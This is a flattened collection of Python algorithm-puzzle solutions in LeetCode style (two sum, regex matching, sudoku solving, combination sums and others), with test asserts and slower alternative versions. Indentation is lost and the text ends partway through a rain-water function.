class Solution:
def twoSum_TLE(self, num, target):
nums = num
for ind1, val in enumerate(nums):
try:
ind2 = nums.index(target - val)
return ind1+1, ind2+1
except ValueError:
continue
def twoSum_TLE_2(self, num, target):
nums = num
for ind1, val in enumerate(nums):
if target-val in nums:
return ind1+1, nums.index(target-val)+1
def twoSum(self, num, target):
hash_map = {}
for ind, val in enumerate(num):
hash_map[val] = ind
for ind1, val in enumerate(num):
if target-val in hash_map:
ind2 = hash_map[target-val]
if ind1!=ind2:
return ind1+1, ind2+1
if __name__=="__main__":
print Solution().twoSum([3, 2, 4], 6)
class Solution:
def findMedianSortedArrays(self, A, B):
m = len(A)
n = len(B)
if ((m+n)&1 == 0):
return (self.find_kth(A, B, (m+n)/2)+self.find_kth(A, B, (m+n)/2-1))/2.0
else:
return self.find_kth(A, B, (m+n)/2)
def find_kth(self, A, B, k):
if not A:  return B[k]
if not B:  return A[k]
if k == 0: return min(A[0], B[0])
m, n = len(A), len(B)
if A[m/2] >= B[n/2]:
if k > m/2+n/2:
return self.find_kth(A, B[n/2+1:], k-n/2-1)
else:
return self.find_kth(A[:m/2], B, k)
else:
return self.find_kth(B, A, k)
if __name__ == "__main__":
assert Solution().findMedianSortedArrays([1, 2], [1, 2, 3]) == 2
assert Solution().findMedianSortedArrays([1, 2], [3]) == 2
assert Solution().findMedianSortedArrays([1], [2, 3]) == 2
assert Solution().findMedianSortedArrays([1, 2], [1, 2]) == 1.5
class Solution:
def lengthOfLongestSubstring(self, s):
visited_last_index = [-1 for _ in range(256)]
longest = 0
start = 0
for ind, val in enumerate(s):
if visited_last_index[ord(val)] == -1:
longest = max(longest, (ind)-start+1)
else:
longest = max(longest, (ind-1)-start+1)
for i in range(start, visited_last_index[ord(val)]):
visited_last_index[ord(s[i])] = -1
start = visited_last_index[ord(val)]+1
visited_last_index[ord(val)] = ind
return longest
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
def __repr__(self):
return repr(self.val)
class Solution:
def addTwoNumbers(self, l1, l2):
result_head = ListNode(0)
cur1 = l1
cur2 = l2
cur = result_head
while cur1 or cur2:
cur.val = cur.val+self.addNode(cur1, cur2)
if cur.val < 10:
if cur1 and cur1.next or cur2 and cur2.next:
cur.next = ListNode(0)
else:
cur.val -= 10
cur.next = ListNode(1)
if cur1:
cur1 = cur1.next
if cur2:
cur2 = cur2.next
cur = cur.next
return result_head
def addNode(self, node1, node2):
if not node1 and not node2:
raise Exception("two nodes are None")
if not node1:
return node2.val
if not node2:
return node1.val
return node1.val+node2.val
if __name__ == "__main__":
l1s = [ListNode(1)]
l2s = [ListNode(9), ListNode(9)]
for i in range(len(l1s)-1):
l1s[i].next = l1s[i+1]
for i in range(len(l2s)-1):
l2s[i].next = l2s[i+1]
Solution().addTwoNumbers(l1s[0], l2s[0])
class Solution(object):
def longestPalindrome(self, s):
if not s:
return
n = len(s)
if n == 1:
return s
ret = s[0]
for i in xrange(0, n):
cur = self.get_palindrome_from_center(s, i, i)
if len(cur) > len(ret): ret = cur
cur = self.get_palindrome_from_center(s, i, i+1)
if len(cur) > len(ret): ret = cur
return ret
def longestPalindrome_TLE(self, s):
length = len(s)
dp = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
dp[i][i] = True
longest = [0, 0]
for j in xrange(length+1):
for i in xrange(j-1, -1, -1):
if i+1 == j:
dp[i][j] = True
else:
dp[i][j] = s[i] == s[j-1] and dp[i+1][j-1]
if dp[i][j] == True and longest[1]-longest[0] < j-i:
longest[0], longest[1] = i, j
return s[longest[0]:longest[1]]
def longestPalindrome_TLE2(self, s):
length = len(s)
longest = ""
dp = [[False for _ in xrange(length+1)] for _ in xrange(length+1)]
for i in xrange(length+1):
dp[i][i] = True
for i in xrange(length):
dp[i][i+1] = True
for i in xrange(length-1):
dp[i][i+2] = s[i] == s[i+1]
if dp[i][i+1]:
longest = s[i:i+2]
for l in xrange(3, length+1):
for i in xrange(0, length-l):
if s[i] == s[i+l-1]:
dp[i][i+l] = dp[i+1][i+l-1]
else:
dp[i][i+l] = False
if dp[i][i+l] and len(longest) < l:
longest = s[i:i+l]
return longest
def get_palindrome_from_center(self, s, begin, end):
while begin >= 0 and end < len(s) and s[begin] == s[end]:
begin -= 1
end += 1
return s[begin+1: end-1+1]
if __name__ == "__main__":
assert Solution().longestPalindrome("dfaaabbbaaac") == "aaabbbaaa
class Solution:
def convert(self, s, nRows):
length = len(s)
matrix = [[] for _ in xrange(nRows)]
i = 0
while i < length:
try:
for j in xrange(nRows):
matrix[j].append(s[i])
i += 1
for j in xrange(nRows-1-1, 0, -1):
matrix[j].append(s[i])
i += 1
except IndexError:
break
lst = ["".join(element) for element in matrix]
return "".join(lst)
if __name__ == "__main__":
assert Solution().convert("ABCD", 2) == "ACBD
class Solution(object):
def reverse(self, x):
sign = -1 if x < 0 else 1
x *= sign
while x:
if x%10 == 0:
x /= 10
else:
break
x = str(x)
lst = list(x)
lst.reverse()
x = "".join(lst)
x = int(x)
return sign*x
if __name__ == "__main__":
print Solution().reverse(123)
class Solution:
def atoi(self, str):
INT_MAX = 2147483647
INT_MIN = -2147483648
str = str.strip()
if not str:
return 0
sign = 1
if str[0] in ("+", "-"):
if str[0] == "-":
sign = -1
str = str[1:]
if not str[0].isdigit():
return 0
for ind, val in enumerate(str):
if not val.isdigit():
str = str[:ind]
break
sum = 0
scale = 1
for element in str[::-1]:
sum += scale*int(element)
scale *= 10
result = sign*sum
if result > INT_MAX:
return INT_MAX
if result < INT_MIN:
return INT_MIN
return result
class Solution:
def isPalindrome(self, x):
if x < 0:
return False
div = 1
while x/div >= 10:
div *= 10
while x > 0:
msb = x/div
lsb = x%10
if msb != lsb:
return False
x %= div
x /= 10
div /= 100
return True
if __name__ == "__main__":
Solution().isPalindrome(2147483647)
class Solution:
def maxArea(self, height):
start = 0
end = len(height)-1
max_area = -1 << 32
while start < end:
area = min(height[start], height[end])*(end-start)
max_area = max(area, max_area)
if height[start] < height[end]:
start += 1
else:
end -= 1
return max_area
class Solution:
def isMatch_error(self, s, p):
tape = s
regex = p
index = 0
state = 0
while index < len(tape) and state < len(regex):
char = tape[index]
if state+1 < len(regex) and regex[state+1] == "*":
if regex[state] != ".":
if char == regex[state]:
while index < len(tape) and tape[index] == char: index += 1
state += 2
else:
state += 2
else:
state += 2
if state < len(regex):
if regex[state] != ".":
while index < len(tape) and tape[index] != regex[state]: index += 1
else:
count = 1
else:
return True
else:
if char == regex[state] or regex[state] == ".":
index += 1
state += 1
else:
break
if index == len(tape) and state == len(regex):
return True
return False
def isMatch_TLE(self, s, p):
tape = s
regex = p
index = 0
state = 0
if not tape and not regex:
return True
if tape and not regex:
return False
if not tape and regex:
if state+1 < len(regex) and regex[state+1] == "*":
return self.isMatch(tape, regex[state+2:])
else:
return False
if state+1 < len(regex) and regex[state+1] == "*":
if tape[index] == regex[state] or regex[state] == ".":
return self.isMatch(tape[index+1:], regex[state:]) or \
self.isMatch(tape[index+1:], regex[state+2:]) or \
self.isMatch(tape[index:], regex[state+2:])
else:
return self.isMatch(tape[index:], regex[state+2:])
else:
if tape[index] == regex[state] or regex[state] == ".":
return self.isMatch(tape[index+1:], regex[state+1:])
else:
return False
def isMatch(self, s, p):
tape = s
regex = p
m = len(tape)
n = len(regex)
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]
dp[m][n] = True
for j in xrange(n-1, -1, -1):
if regex[j] == "*":
dp[m][j] = dp[m][j+1]
elif j+1 < n and regex[j+1] == "*":
dp[m][j] = dp[m][j+1]
else:
dp[m][j] = False
for i in xrange(m-1, -1, -1):
for j in xrange(n-1, -1, -1):
if regex[j] == "*":
if j-1 >= 0 and regex[j-1] != "*":
dp[i][j] = dp[i][j+1]
else:
return False
elif j+1 < n and regex[j+1] == "*":
if tape[i] == regex[j] or regex[j] == ".":
dp[i][j] = dp[i][j+2] or dp[i+1][j] or dp[i+1][j+2]
else:
dp[i][j] = dp[i][j+2]
else:
if tape[i] == regex[j] or regex[j] == ".":
dp[i][j] = dp[i+1][j+1]
else:
dp[i][j] = False
return dp[0][0]
if __name__ == "__main__":
assert Solution().isMatch("aa", "a") == False
assert Solution().isMatch("aa", "aa") == True
assert Solution().isMatch("aaa", "aa") == False
assert Solution().isMatch("aa", "a*") == True
assert Solution().isMatch("ab", ".*") == True
assert Solution().isMatch("aab", "c*a*b") == True
assert Solution().isMatch("aaa", "a*a") == True
assert Solution().isMatch("bbbba", ".*a*a") == True
assert Solution().isMatch("a", "aa*") == True
int2roman = {
1: "I",
4: "IV",
5: "V",
9: "IX",
10: "X",
40: "XL",
50: "L",
90: "XC",
100: "C",
400: "CD",
500: "D",
900: "CM",
1000: "M"
}
class Solution:
def intToRoman(self, num):
string_builder = []
components = [1, 4, 5, 9, 10, 10, 40, 50, 90, 100, 400, 500, 900, 1000]
for component in reversed(components):
while num >= component:
string_builder.append(int2roman[component])
num -= component
return "".join(string_builder)
roman2int = {
"I": 1,
"V": 5,
"X": 10,
"L": 50,
"C": 100,
"D": 500,
"M": 1000
}
class Solution:
def romanToInt(self, s):
result = 0
for ind, val in enumerate(s):
if ind > 0 and roman2int[val] > roman2int[s[ind-1]]:
result -= roman2int[s[ind-1]]
result += roman2int[val]-roman2int[s[ind-1]]
else:
result += roman2int[val]
return result
class Solution:
def threeSum_duplicate(self, num):
reverse_map = {}
for ind, val in enumerate(num):
if val not in reverse_map:
reverse_map[val] = [ind]
else:
reverse_map[val].append(ind)
result = []
for i in xrange(len(num)):
for j in xrange(i, len(num)):
target = 0-num[i]-num[j]
if target not in reverse_map:
continue
for index in reverse_map[target]:
if i != index and j != index:
result.append([num[i], num[j], target])
break
return result
def threeSum_TLE(self, num):
reverse_map = {}
for ind, val in enumerate(num):
if val not in reverse_map:
reverse_map[val] = [ind]
else:
reverse_map[val].append(ind)
result = {}
for i in xrange(len(num)):
for j in xrange(i, len(num)):
target = 0-num[i]-num[j]
if target not in reverse_map:
continue
for index in reverse_map[target]:
if index != i and index != j:
lst = sorted([num[i], num[j], target])
lst = tuple(lst)
result[lst] = 1
break
return result.keys()
def threeSum(self, num):
result = []
num.sort()
i = 0
while i < len(num)-2:
j = i+1
k = len(num)-1
while j < k:
lst = [num[i], num[j], num[k]]
if sum(lst) == 0:
result.append(lst)
k -= 1
j += 1
while j < k and num[j] == num[j-1]:
j += 1
while j < k and num[k] == num[k+1]:
k -= 1
elif sum(lst) > 0:
k -= 1
else:
j += 1
i += 1
while i < len(num)-2 and num[i] == num[i-1]:
i += 1
return result
if __name__ == "__main__":
print Solution().threeSum([-1, 0, 1, 2, -1, -4])
class Solution(object):
def longestCommonPrefix(self, strs):
if not strs: return ""
l = min(map(len, strs))
i = 0
while i < l:
char = strs[0][i]
for s in strs:
if s[i] != char:
return strs[0][:i]
i += 1
return strs[0][:i]
def longestCommonPrefixComplex(self, strs):
if not strs:
return ""
n = len(strs)
str_builder = ""
min_len = min(len(string) for string in strs)
for i in range(min_len):
char = strs[0][i]
j = 0
while j < n:
try:
if strs[j][i] != char: break
j += 1
except IndexError:
break
if j == n:
str_builder += char
else:
break
return str_builder
if __name__ == "__main__":
strs = ["abc", "abcd"]
print Solution().longestCommonPrefix(strs)
class Solution:
def threeSumClosest(self, num, target):
min_distance = 1<<32
num.sort()
min_summation = 0
for i, val in enumerate(num):
j = i+1
k = len(num)-1
while j<k:
lst = [val, num[j], num[k]]
if min_distance>abs(target-sum(lst)):
min_summation = sum(lst)
if sum(lst)==target:
return min_summation
min_distance = abs(target-min_summation)
elif sum(lst)>target:
k -= 1
else:
j += 1
return min_summation
if __name__=="__main__":
print Solution().threeSumClosest([1, 1, 1, 1], 0)
class Solution:
digit2letters = {
'2': "abc",
'3': "def",
'4': "ghi",
'5': "jkl",
'6': "mno",
'7': "pqrs",
'8': "tuv",
'9': "wxyz"
}
def letterCombinations(self, digits):
result = []
self.dfs_traverse(digits, "", result)
return result
def dfs_traverse(self, string_seq, current, result):
if not string_seq:
result.append(current)
return
for letter in self.digit2letters[string_seq[0]]:
self.dfs_traverse(string_seq[1:], current+letter, result)
if __name__=="__main__":
print Solution().letterCombinations("23")
class Solution:
def fourSum_TLE(self, num, target):
result = []
num.sort()
length = len(num)
h = 0
while h<length-3:
i = h+1
while i<length-2:
j = i+1
k = length-1
while j<k:
lst = [num[h], num[i], num[j], num[k]]
summation = sum(lst)
if summation==target:
result.append(lst)
k -= 1
j += 1
while j<k and num[j]==num[j-1]:
j += 1
while j<k and num[k]==num[k+1]:
k -= 1
elif summation>target:
k -= 1
else:
j += 1
i += 1
while i<length-2 and num[i]==num[i-1]:
i += 1
h += 1
while h<length-3 and num[h]==num[h-1]:
h += 1
return result
def fourSum(self, num, target):
length, result_set, sum2index = len(num), set(), {}
if length<4:
return []
num.sort()
for p in xrange(length):
for q in xrange(p+1, length):
if num[p]+num[q] not in sum2index:
sum2index[num[p]+num[q]] = [(p, q)]
else:
sum2index[num[p]+num[q]].append((p, q))
for i in xrange(length):
for j in xrange(i+1, length-2):
sum_remain = target-num[i]-num[j]
if sum_remain in sum2index:
for pair in sum2index[sum_remain]:
if pair[0]>j:
result_set.add(( num[i], num[j], num[pair[0]], num[pair[1]] ))
return [list(i) for i in result_set]
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def removeNthFromEnd(self, head, n):
dummy = ListNode(0)
dummy.next = head
length = 0
pre = dummy
while pre.next:
length += 1
pre=pre.next
pre = dummy
count = 0
while pre.next:
cur = pre.next
if count==length-n:
pre.next = cur.next
break
else:
count += 1
pre = pre.next
return dummy.next
class Solution:
def isValid(self, s):
put_set = ("(", "[", "{")
pop_set = (")", "]", "}")
pair = dict(zip(put_set, pop_set))
stack = []
for element in s:
if element in put_set:
stack.append(pair[element])
elif element in pop_set:
if not stack or element != stack.pop():
return False
return True if not stack else False
if __name__ == "__main__":
assert Solution().isValid("()")
from typing import List
class Solution:
def generateParenthesis(self, n: int) -> List[str]:
F: List[List[str]] = [[] for _ in range(n + 1)]
F[0].append("")
for i in range(1, n+1):
for j in range(i):
for s1 in F[j]:
for s2 in F[i-j-1]:
F[i].append(f"({s1}){s2}")
return F[n]
class Solution:
def generateParenthesis(self, n):
result = []
self.generateParenthesisDfs(result, "", n, n)
return result
def generateParenthesisDfs(self, result, cur, left, right):
if left == 0 and right == 0:
result.append(cur)
return
if left > 0:
self.generateParenthesisDfs(result, cur + "(", left - 1, right)
if right > left:
self.generateParenthesisDfs(result, cur + ")", left, right - 1)
if __name__=="__main__":
assert Solution().generateParenthesis(3)==['((()))', '(()())', '(())()', '()(())', '()()()']
import heapq
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def mergeKLists_TLE1(self, lists):
lists = filter(lambda x: x is not None, lists)
if not lists:
return
length = len(lists)
factor = 2
while length>0:
i = 0
while True:
try:
lists[i] = self.mergeTwoLists(lists[i], lists[i+factor/2])
except IndexError:
break
i += factor
length /= 2
factor *= 2
return lists[0]
def mergeKLists_TLE2(self, lists):
lists = filter(lambda x: x is not None, lists)
if not lists:
return
result = lists[0]
for i in xrange(1, len(lists)):
result = self.mergeTwoLists(result, lists[i])
return result
def mergeTwoLists(self, l1, l2):
dummy = ListNode(0)
dummy.next = l1
pre = dummy
the_other = l2
while pre and pre.next:
cur = pre.next
if the_other and cur.val>the_other.val:
temp = the_other.next
pre.next, the_other.next = the_other, cur
the_other = temp
pre = pre.next
if the_other:
pre.next = the_other
return dummy.next
def mergeKLists(self, lists):
heap = []
for head_node in lists:
if head_node:
heapq.heappush(heap, (head_node.val, head_node))
dummy = ListNode(0)
cur = dummy
while heap:
smallest_node = heapq.heappop(heap)[1]
cur.next = smallest_node
cur = cur.next
if smallest_node.next:
heapq.heappush(heap, (smallest_node.next.val, smallest_node.next))
return dummy.next
if __name__=="__main__":
assert  Solution().mergeKLists([None, None])==None
assert Solution().mergeKLists([ListNode(1), ListNode(0)]).val==0
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def swapPairs(self, head):
dummy = ListNode(0)
dummy.next = head
pre = dummy
while pre.next and pre.next.next:
node1 = pre.next
node2 = pre.next.next
pre.next, node1.next, node2.next = node2, node2.next, node1
pre = pre.next.next
return dummy.next
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def reverseKGroup(self, head, k):
dummy = ListNode(0)
dummy.next = head
pre = dummy
cur_lst = self.generate_lst(pre.next, k)
while pre and not None in cur_lst:
temp = cur_lst[-1].next
pre.next = cur_lst[-1]
for i in reversed(xrange(k)):
if i==0:
cur_lst[i].next = temp
else:
cur_lst[i].next = cur_lst[i-1]
pre = cur_lst[0]
cur_lst = self.generate_lst(pre.next, k)
return dummy.next
def generate_lst(self, node, k):
lst = []
cur = node
for i in xrange(k):
if cur:
lst.append(cur)
cur = cur.next
else:
lst.append(None)
return lst
class Solution:
def removeElement_negative_index(self, A, elem):
open_ptr = 0
back_ptr = -1
while len(A)+back_ptr>=open_ptr:
if A[open_ptr]==elem:
A[open_ptr], A[back_ptr] = A[back_ptr], A[open_ptr]
back_ptr -= 1
else:
open_ptr += 1
return len(A)+back_ptr+1
def removeElement(self, A, elem):
open_ptr = 0
end_ptr = len(A)
while open_ptr<end_ptr:
if A[open_ptr]==elem:
end_ptr -= 1
A[open_ptr], A[end_ptr] = A[end_ptr], A[open_ptr]
else:
open_ptr += 1
return end_ptr
if __name__=="__main__":
A = [1, 3, 4, 2, 5, 4]
elem = 4
solution = Solution()
assert solution.removeElement(A, elem)==solution.removeElement_negative_index(A, elem)
class Solution:
def removeDuplicates(self, A):
length = len(A)
if length==0 or length==1:
return length
closed_ptr = 0
open_ptr = 1
while open_ptr<length:
if A[closed_ptr]==A[open_ptr]:
open_ptr += 1
continue
non_duplicate = A[open_ptr]
A[closed_ptr+1] = non_duplicate
closed_ptr += 1
return closed_ptr+1
def removeDuplicates_another_loop_style(self, A):
length = len(A)
if length==0 or length==1:
return length
closed_ptr = 0
open_ptr = 1
while open_ptr<length:
while open_ptr<length and A[closed_ptr]==A[open_ptr]:
open_ptr += 1
if open_ptr<length:
non_duplicate = A[open_ptr]
A[closed_ptr+1] = non_duplicate
closed_ptr += 1
return closed_ptr+1
MAX_INT = 2147483647
MIN_INT = -2147483648
class Solution:
def divide(self, dividend, divisor):
if divisor == 0 or dividend == 0:
return 0
if dividend == MIN_INT and divisor == -1:
return MAX_INT
sign = 1 if dividend >= 0 and divisor >= 0 or dividend < 0 and divisor < 0 else -1
dividend = abs(dividend)
divisor = abs(divisor)
result = 0
while dividend >= divisor:
current_result = 1
current = divisor
while current <= dividend:
current <<= 1
current_result <<= 1
dividend -= current>>1
result += current_result>>1
return sign*result
if __name__ == "__main__":
assert Solution().divide(5, -1) == -5
class Solution:
def strStr_brute_force(self, haystack, needle):
l_hay = len(haystack)
l_ndl = len(needle)
for i in xrange(l_hay-l_ndl+1):
if haystack[i:i+l_ndl]==needle:
return haystack[i:]
return None
def strStr(self, haystack, needle):
ln = len(needle)
lh = len(haystack)
if ln==0:
return haystack
if ln==1:
try:
index = haystack.index(needle)
return haystack[index:]
except ValueError:
return None
T = [0 for _ in xrange(ln)]
T[0] = -1
T[1] = 0
pos = 2
cnd = 0
while pos<ln:
if needle[pos-1]==needle[cnd]:
cnd += 1
T[pos] = cnd
pos += 1
elif T[cnd]!=-1:
cnd = T[cnd]
else:
cnd = 0
T[pos] = cnd
pos += 1
i = 0
m = 0
while m+i<lh:
if needle[i]==haystack[m+i]:
i += 1
if i==ln:
return haystack[m:]
else:
if T[i]!=-1:
m = m+i-T[i]
i = T[i]
else:
m += 1
i = 0
return None
if __name__=="__main__":
needle = "ABCDABD"
haystack = "ABC ABCDAB ABCDABCDABDE"
needle = "aaa"
haystack = "aaa"
solution = Solution()
assert solution.strStr_brute_force(haystack, needle)==solution.strStr(haystack, needle)
class Solution:
def findSubstring_TLE(self, S, L):
if not L:
return
k = len(L[0])
l = len(L)
working_list = list(L)
result = []
window_t = -1
window = []
i = 0
while i<=len(S)-3:
if len(window)==l:
result.append(window_t-l*k)
word = S[i:i+3]
if word in working_list:
window.append(word)
working_list.remove(word)
window_t = i+3
i += 3
elif word not in L:
if window:
i = window_t-len(window)*k+1
else:
i += 1
window = []
window_t = -1
working_list = list(L)
elif word in L and word not in working_list:
window = window[window.index(word)+1:]
window.append(word)
window_t = i+3
i += 3
return result
def findSubstring(self, S, L):
if not L:
return
k = len(L[0])
l = len(L)
Lmap = {}
for item in L:
if item in Lmap:
Lmap[item] += 1
else:
Lmap[item] = 1
Lmap_original = dict(Lmap)
ret = []
win_e = -1
working_win = []
i = 0
while i<len(S):
if len(working_win)==l:
ret.append(win_e-l*k)
candidate = win_e-l*k+1
if S[candidate:candidate+k] in Lmap:
win_e = -1
i = candidate
Lmap = dict(Lmap_original)
working_win = []
word = S[i:i+k]
if word in Lmap and Lmap[word]>0:
working_win.append(word)
Lmap[word] -= 1
win_e = i+k
i += k
elif word not in Lmap:
if working_win:
i = win_e-len(working_win)*k+1
else:
i += 1
working_win = []
win_e = -1
Lmap = dict(Lmap_original)
elif word in Lmap and Lmap[word]==0:
for j in xrange(0, working_win.index(word)+1):
Lmap[working_win[j]] += 1
working_win = working_win[working_win.index(word)+1:]
working_win.append(word)
Lmap[word] -= 1
win_e = i+k
i += k
if len(working_win)==l:
ret.append(win_e-l*k)
return ret
if __name__=="__main__":
assert Solution().findSubstring("abababab", ["a","b","a"])==[0,2,4]
assert Solution().findSubstring("a", ["a"])==[0]
assert Solution().findSubstring("lingmindraboofooowingdingbarrwingmonkeypoundcake", ["fooo","barr","wing","ding","wing"])==[13]
assert Solution().findSubstring("barfoofoofoobarman", ["foo", "foo"])==[3, 6]
class Solution:
def nextPermutation(self, num):
length = len(num)
partition_num_index = 0
change_num_index = 0
for i in reversed(xrange(1, length)):
if num[i]>num[i-1]:
partition_num_index = i-1
break
for i in reversed(xrange(1, length)):
if num[i]>num[partition_num_index]:
change_num_index = i
break
num[partition_num_index], num[change_num_index] = num[change_num_index], num[partition_num_index]
if partition_num_index==change_num_index==0:
num.reverse()
else:
num[partition_num_index+1:] = reversed(num[partition_num_index+1:])
return num
if __name__=="__main__":
print Solution().nextPermutation([3, 2, 1])
class Solution(object):
def longestValidParentheses(self, s):
stk = []
maxa = 0
for idx, val in enumerate(s):
if val == ")" and stk and s[stk[-1]] == "(":
stk.pop()
if not stk:
maxa = max(maxa, idx+1)
else:
maxa = max(maxa, idx-stk[-1])
else:
stk.append(idx)
return maxa
if __name__ == "__main__":
assert Solution().longestValidParentheses("(()()") == 4
assert Solution().longestValidParentheses("()(()") == 2
assert Solution().longestValidParentheses("(()") == 2
assert Solution().longestValidParentheses(")()())") == 4
class Solution:
def searchRange(self, A, target):
result = []
length = len(A)
start = 0
end = length
while start<end:
mid = (start+end)/2
if A[mid]<target:
start = mid+1
else:
end = mid
if start<length and A[start]==target:
result.append(start)
else:
return [-1, -1]
start = start
end = length
while start<end:
mid = (start+end)/2
if A[mid]<=target:
start = mid+1
else:
end = mid
result.append(start-1)
return result
class Solution:
def search(self, A, target):
length = len(A)
start = 0
end = length-1
while start<=end:
mid = (start+end)/2
if A[mid]==target:
return mid
if A[start]<A[mid]<A[end]:
if target>A[mid]:
start = mid+1
else:
end = mid-1
elif A[start]>A[mid] and A[mid]<A[end]:
if target>A[mid] and target<=A[end]:
start = mid+1
else:
end = mid -1
else:
if target<A[mid] and target>=A[start]:
end = mid-1
else:
start = mid+1
return -1
if __name__=="__main__":
print Solution().search([5,1,3], 5)
class Solution:
def searchInsert_complex(self, A, target):
length = len(A)
if not A or length==0:
return 0
start = 0
end = length -1
while True:
mid = (start+end)/2
if target==A[mid]:
return mid
elif target<A[mid]:
end = mid-1
if not start<=end:
return mid if mid>=0 else 0
else:
start = mid+1
if not start<=end:
return start
def searchInsert(self, A, target):
length = len(A)
if not A or length==0:
return 0
start = 0
end = length
while start<end:
mid = (start + end) / 2
if target==A[mid]:
return mid
elif target<A[mid]:
end = mid
else:
start = mid + 1
return start
if __name__=="__main__":
assert Solution().searchInsert([1, 3, 5, 6], 5)==2
assert Solution().searchInsert([1, 3, 5, 6], 2)==1
assert Solution().searchInsert([1, 3, 5, 6], 7)==4
assert Solution().searchInsert([1, 3, 5, 6], 0)==0
class Solution:
def isValidSudoku(self, board):
for i in xrange(9):
row = []
column = []
square = []
for j in xrange(9):
try:
row_element = int(board[i][j])
if row_element in row:
return False
else:
row.append(row_element)
except ValueError:
pass
try:
column_element = int(board[j][i])
if column_element in column:
return False
else:
column.append(column_element)
except ValueError:
pass
try:
square_element = int(board[i/3*3 + j/3][i%3*3 + j%3])
if square_element in square:
return False
else:
square.append(square_element)
except ValueError:
pass
return True
if __name__=="__main__":
assert Solution().isValidSudoku(
["..4...63.", ".........", "5......9.", "...56....", "4.3.....1", "...7.....", "...5.....", ".........",
"........."]
)==False
class Solution:
def solveSudoku(self, board):
for row in xrange(len(board)):
board[row] = list(board[row])
self.solve(board, 0, 0)
for row in xrange(len(board)):
board[row] = "".join(board[row])
def solve_TLE(self, board):
n = len(board)
if all([board[i/n][i%n]!="." for i in xrange(n*n)]):
return True
for i in xrange(n):
for j in xrange(n):
if board[i][j]==".":
for num in range(1, 10):
num_str = str(num)
condition_row = all([board[i][col]!=num_str for col in xrange(n)])
condition_col = all([board[row][j]!=num_str for row in xrange(n)])
condition_square = all([board[i/3*3+count/3][j/3*3+count%3]!=num_str for count in xrange(n)])
if condition_col and condition_row and condition_square:
board[i][j] = num_str
if not self.solve(board):
board[i][j] = "."
else:
return True
return False
def solve(self, board, i, j):
if j>=9:
return self.solve(board, i+1, 0)
if i==9:
return True
if board[i][j]==".":
for num in range(1, 10):
num_str = str(num)
if all([board[i][col]!=num_str for col in xrange(9)]) and \
all([board[row][j]!=num_str for row in xrange(9)]) and \
all([board[i/3*3+count/3][j/3*3+count%3]!=num_str for count in xrange(9)]):
board[i][j] = num_str
if not self.solve(board, i, j+1):
board[i][j] = "."
else:
return True
else:
return self.solve(board, i, j+1)
return False
if __name__=="__main__":
Solution().solveSudoku(
["..9748...", "7........", ".2.1.9...", "..7...24.", ".64.1.59.", ".98...3..", "...8.3.2.", "........6",
"...2759.."]
)
class Solution:
def countAndSay(self, n):
string = "1"
for i in range(1, n):
string = self.singleCountAndSay(string)
return string
def singleCountAndSay(self, num_string):
string_builder = ""
i = 0
while i<len(num_string):
j = i+1
while j<len(num_string) and num_string[j]==num_string[i]:
j += 1
count = j-i
string_builder += str(count)+str(num_string[i])
i = j
return string_builder
if __name__=="__main__":
print Solution().countAndSay(4)
from typing import List
class Solution:
def combinationSum2(self, candidates: List[int], target: int) -> List[List[int]]:
ret = []
candidates.sort()
self.dfs(candidates, 0, [], 0, target, ret)
return ret
def dfs(self, candidates, i, cur, cur_sum, target, ret):
if cur_sum == target:
ret.append(list(cur))
return
if cur_sum > target or i >= len(candidates):
return
j = i + 1
while j < len(candidates) and candidates[j] == candidates[i]:
j += 1
self.dfs(candidates, j, cur, cur_sum, target, ret)
cur.append(candidates[i])
cur_sum += candidates[i]
self.dfs(candidates, i + 1, cur, cur_sum, target, ret)
cur.pop()
cur_sum -= candidates[i]
if __name__ == "__main__":
assert Solution().combinationSum2([2,5,2,1,2], 5) == [[5], [1,2,2]]
class Solution:
def combinationSum2(self, candidates, target):
result = []
candidates.sort()
self.get_combination_sum(candidates, [], target, result)
return result
def get_combination_sum(self, candidates, cur, target, result):
if sum(cur)==target:
result.append(cur)
return
if sum(cur)>target:
return
ind = 0
while ind<len(candidates):
self.get_combination_sum(candidates[ind+1:], cur+[candidates[ind]], target, result)
while ind+1<len(candidates) and candidates[ind]==candidates[ind+1]: ind+= 1
ind += 1
if __name__=="__main__":
print Solution().combinationSum2([10, 1, 2, 7, 6, 1, 5], 8)
from typing import List
class Solution:
def combinationSum(self, candidates: List[int], target: int) -> List[List[int]]:
ret = []
self.dfs(candidates, 0, [], 0, target, ret)
return ret
def dfs(self, candidates, i, cur, cur_sum, target, ret):
if cur_sum == target:
ret.append(list(cur))
return
if cur_sum > target or i >= len(candidates):
return
self.dfs(candidates, i + 1, cur, cur_sum, target, ret)
cur.append(candidates[i])
cur_sum += candidates[i]
self.dfs(candidates, i, cur, cur_sum, target, ret)
cur.pop()
cur_sum -= candidates[i]
class Solution:
def combinationSum(self, candidates, target):
candidates.sort()
result = []
self.get_combination(target, candidates, [], result)
return result
def get_combination(self, target, candidates, current, result):
if not candidates or sum(current)>target:
return
if sum(current)==target:
result.append(current)
return
for ind, val in enumerate(candidates):
self.get_combination(target, candidates[ind:], current+[val], result)
if __name__=="__main__":
print Solution().combinationSum([2,3,6,7], 7)
class Solution:
def firstMissingPositive(self, A):
if not A:
return 1
i = 0
length = len(A)
while i<length:
current = A[i]
if current<=0 or current>length or A[current-1]==current:
i += 1
else:
A[current-1], A[i] = current, A[current-1]
for i in xrange(length):
if A[i]!=i+1:
return i+1
return A[-1]+1
if __name__=="__main__":
assert Solution().firstMissingPositive([3,4,-1,1])==2
class Solution:
def trap(self, height: List[int]) -> int:
n = len(height)
lefts = [0 for _ in range(n+1)]
rights = [0 for _ in range(n+1)]
for i in range(1, n+1):
lefts[i] = max(lefts[i-1], height[i-1])
for i in range(n-1, -1, -1):
rights[i] = max(rights[i+1], height[i])
ret = 0
for i in range(n):
ret += max(
0,
min(lefts[i], rights[i+1]) - height[i]
)
return ret
class Solution:
def trap(self, A):
left_maxs = [0 for _ in A]
right_maxs = [0 for _ in A]
left_max = 0
for ind, val in enumerate(A):
left_max = max(left_max, val)
left_maxs[ind] = left_max
right_max = 0
for ind, val in reversed(list(enumerate(A))):
right_max = max(right_max, val)
right_maxs[ind] = right_max
volume = 0
